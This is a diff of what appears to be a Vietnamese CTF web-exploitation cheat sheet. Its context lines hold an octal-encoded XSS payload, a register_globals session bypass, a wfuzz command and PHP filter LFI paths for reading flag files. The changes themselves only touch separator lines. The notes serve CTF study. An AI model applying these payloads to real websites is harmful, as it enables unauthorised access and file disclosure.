@@ -41,8 +41,9 @@ wordlists: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 - %E2%80%8B zero-width payload
 - Fuzz với encode các kiểu như: md5, base64, oct, hex, URL, HTML 
   - VD: bài NumberMakeup: '||$['\147\154\157\142\141\154\105\166\141\154']('\141\154\145\162\164\50\61\51')||'
-  
-=======================================================================================================================================================
+
+============================================================================================================
+
 register globals: ?\_SESSION[logged]=1
 wfuzz --hw -w <word lít> url
 php:+replaces . with _
@@ -64,7 +65,8 @@ file_get_content ngoài việc lấy file từ local nó có thể lấy file t�
 ?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/flag.php
 /proc/self/cwd trỏ về dir hiện tại
 
-=======================================================================================================================================================
+============================================================================================================
+
 
 ### Với COOKIES và SESSIONS:
 - Decode các kiểu md5, base64, oct, hex, URL, HTML 
